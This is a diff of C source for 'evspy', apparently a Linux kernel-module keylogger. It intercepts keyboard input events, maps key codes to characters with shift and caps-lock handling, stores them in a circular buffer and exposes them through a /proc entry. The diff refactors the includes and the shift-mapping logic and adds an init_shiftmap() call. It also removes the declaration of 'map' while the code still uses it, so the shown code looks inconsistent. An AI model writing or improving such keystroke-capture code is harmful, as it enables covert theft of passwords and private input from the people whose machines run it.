@@ -20,23 +20,12 @@
  * <0xwille@gmail.com>
  */
 
-#include <linux/module.h>
-#include <linux/input.h>
-#include <linux/slab.h>
-#include <linux/init.h>
-#include <linux/proc_fs.h>
-#include <linux/stat.h>
-#include <linux/string.h>
-#include <linux/cred.h>
-#include <linux/sched.h>
 #include "evspy-core.h"
-#include "khashmap/khashmap.h"
 
 
 static char *buffer;		// circular buffer
 static char *rdp;			// read pointer
 static char *wrp;			// write pointer
-static char *map = EVS_MAP;	// current keyboard layout
 static unsigned short int capslock_state = EVS_VAL_FREE;
 static unsigned short int shift = 0;
 
@@ -180,7 +169,7 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
 		special_char(KEY_LEFTSHIFT, capslock_state);
 		return;
-	} else if (type != EV_KEY || unlikely(code >= sizeof(EVS_MAP))) {
+	} else if (type != EV_KEY || unlikely(code >= sizeof(map))) {
 		return;
 	}
 
@@ -191,7 +180,7 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	// "Direct" keys (alphanumeric + some symbols)
 	} else if (value == EVS_VAL_PRESS) {
 		if (shift)
-			evs_insert(evs_shift(map[code]));
+			evs_insert(evs_shift(code));
 		else
 			evs_insert(map[code]);
 	}
@@ -253,6 +242,8 @@ static struct input_handler evspy_handler = {
 static int __init evspy_init(void)
 {
 	create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);
+
+	init_shiftmap();
 
 	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
 	rdp = wrp = buffer;
